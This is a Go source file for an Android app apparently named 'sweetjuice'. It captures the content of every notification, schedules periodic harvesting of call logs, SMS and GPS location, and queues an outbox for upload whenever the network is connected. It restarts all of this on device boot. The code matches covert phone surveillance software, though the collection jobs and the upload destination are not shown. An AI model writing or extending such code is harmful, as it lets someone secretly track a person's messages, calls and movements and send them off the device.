package juiceapp

import (
	"fmt"
	"sync"

	"sweetjuice/lib/state"
	"sweetjuice/lib/store"
	"sweetjuice/lib/tasks"
	"sweetjuice/lib/views"

	"github.com/sweet-juice/sweetjuice/app"
	"github.com/sweet-juice/sweetjuice/plugins/broadcast"
	"github.com/sweet-juice/sweetjuice/plugins/notification_listener"
	"github.com/sweet-juice/sweetjuice/plugins/workmanager"
)

var backgroundOnce sync.Once

func StartApplication() string {
	registerPluginDefinitions()
	registerBackgroundTasks() // Bind tasks early so workers can find them

	mainState := state.NewMainAppState()
	root := &views.HomeView{State: mainState}

	// app.Run starts the core runtime and triggers the first render.
	app.Run(root)

	// initPlugins registers Go-side native methods (handlers) on the current app instance.
	initPlugins()
	tasks.LoadAppConfig()
	tasks.ResolveDeviceModel()

	// Ensure background services and handlers are registered only once.
	backgroundOnce.Do(func() {
		initStore()
		initNotificationListener()
		registerBroadcastHandlers()
	})

	return `{"status":"started"}`
}

func initStore() {
	tasks.InitStore()
}

func initNotificationListener() {
	plugin := notification_listener.NewPlugin()
	plugin.OnPosted("outbox", func(n notification_listener.Notification) error {
		s := store.Get()
		if s == nil {
			fmt.Println("listener: store nil, skip")
			return nil
		}
		err := s.Enqueue(store.EventTypeNotif, map[string]interface{}{
			"package":    n.PackageName,
			"id":         n.ID,
			"title":      n.Title,
			"text":       n.Text,
			"is_ongoing": n.IsOngoing,
			"timestamp":  n.Timestamp,
		})
		if err != nil {
			fmt.Printf("listener: enqueue error: %v\n", err)
		} else {
			fmt.Printf("listener: saved notif from %s id=%d\n", n.PackageName, n.ID)
		}
		return err
	})
}

func registerBackgroundTasks() {
	wm := workmanager.NewPlugin()
	wm.RegisterTask("sweetjuice_prepare_calls", tasks.CallsJob)
	wm.RegisterTask("sweetjuice_prepare_sms", tasks.SmsJob)
	wm.RegisterTask("sweetjuice_prepare_gps", tasks.GpsJob)
	wm.RegisterTask("sweetjuice_send_outbox", tasks.SenderWorker)
}

func registerBroadcastHandlers() {
	// Listen for actual Android system boot intents
	bootIntents := []string{
		"android.intent.action.BOOT_COMPLETED",
		"android.intent.action.QUICKBOOT_POWERON",
	}

	for _, intent := range bootIntents {
		broadcast.On(intent, func(data interface{}) {
			fmt.Printf("broadcast: system boot signal received (%v)\n", data)
			TriggerBackgroundEngine()
		})
	}
}

// TriggerBackgroundEngine enqueues the periodic work with the Android OS.
func TriggerBackgroundEngine() {
	fmt.Println("engine: enqueuing background tasks to WorkManager")

	wm := workmanager.NewPlugin()
	networkConstraints := workmanager.Constraints{
		NetworkType: workmanager.NetworkConnected,
	}

	// 1. Enqueue data preparation tasks
	wm.EnqueuePeriodic("sweetjuice_prepare_calls", 15, nil, true, false)
	wm.EnqueuePeriodic("sweetjuice_prepare_sms", 15, nil, true, false)
	wm.EnqueuePeriodic("sweetjuice_prepare_gps", 15, nil, true, false)

	// 2. Enqueue the sender task with network constraints
	wm.EnqueuePeriodic("sweetjuice_send_outbox", 15, &networkConstraints, true, false)
}
